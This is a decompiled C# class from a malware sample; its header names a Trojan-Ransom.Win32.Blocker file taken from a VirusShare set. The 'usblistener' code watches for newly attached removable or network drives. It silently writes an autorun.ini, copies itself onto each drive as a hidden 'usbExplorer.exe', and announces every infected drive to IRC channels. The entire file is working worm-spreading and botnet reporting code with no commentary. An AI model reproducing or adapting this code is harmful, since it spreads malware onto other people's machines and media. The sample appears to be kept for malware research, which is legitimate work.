// Decompiled with JetBrains decompiler
// Type: rundll32.spreaders.usblistener
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace rundll32.spreaders
{
  internal static class usblistener
  {
    private static Thread listenThread;
    private static bool _running = false;
    private static DriveInfo[] drives;
    private static irc _irc;

    public static bool running => usblistener._running;

    public static void start(irc ircObj)
    {
      if (usblistener._running)
        return;
      usblistener._irc = ircObj;
      usblistener._running = true;
      usblistener.listenThread = new Thread(new ThreadStart(usblistener.listen));
      usblistener.listenThread.Start();
    }

    public static void stop()
    {
      if (!usblistener._running)
        return;
      usblistener._running = false;
      usblistener.listenThread = new Thread(new ThreadStart(usblistener.listen));
      usblistener.listenThread.Abort();
    }

    private static void listen()
    {
      while (true)
      {
        try
        {
          Thread.Sleep(100);
          DriveInfo[] drives = DriveInfo.GetDrives();
          foreach (DriveInfo di in drives)
          {
            bool flag = false;
            try
            {
              foreach (DriveInfo drive in usblistener.drives)
              {
                if (drive.Name == di.Name)
                  flag = true;
              }
            }
            catch
            {
            }
            if (!flag)
              usblistener.newDrive(di);
          }
          usblistener.drives = drives;
        }
        catch
        {
        }
      }
    }

    private static void newDrive(DriveInfo di)
    {
      try
      {
        if (di.DriveType != DriveType.Network && di.DriveType != DriveType.Removable && di.DriveType != DriveType.Unknown || File.Exists(di.RootDirectory.FullName + "autorun.ini"))
          return;
        foreach (string str in new List<string>()
        {
          "echo [autorun]>>" + di.RootDirectory.FullName + "autorun.ini",
          "echo open=usbExplorer.exe usb>>" + di.RootDirectory.FullName + "autorun.ini",
          "echo shellexecute=usbExplorer.exe usb>>" + di.RootDirectory.FullName + "autorun.ini",
          "echo action=USB Drive Explorer>>" + di.RootDirectory.FullName + "autorun.ini",
          "copy /b /y \"" + Application.ExecutablePath + "\" \"" + di.RootDirectory.FullName + "usbExplorer.exe\"",
          "attrib +r +s +h +i " + di.RootDirectory.FullName + "usbExplorer.exe",
          "attrib +r +s +h +i " + di.RootDirectory.FullName + "autorun.ini"
        })
          Process.Start(new ProcessStartInfo()
          {
            FileName = "cmd",
            CreateNoWindow = true,
            UseShellExecute = true,
            Arguments = "/c " + str,
            WindowStyle = ProcessWindowStyle.Hidden
          }).WaitForExit();
        if (!File.Exists(di.RootDirectory.FullName + "autorun.ini") || !File.Exists(di.RootDirectory.FullName + "explorer.exe"))
          return;
        foreach (string[] onConnChannel in config.onConnChannels)
          usblistener._irc.sendMessage(onConnChannel[0], ".:USB:. - \u000308Infected Drive \"\u000309" + di.RootDirectory.FullName + "\u000308\" !");
      }
      catch
      {
      }
    }
  }
}
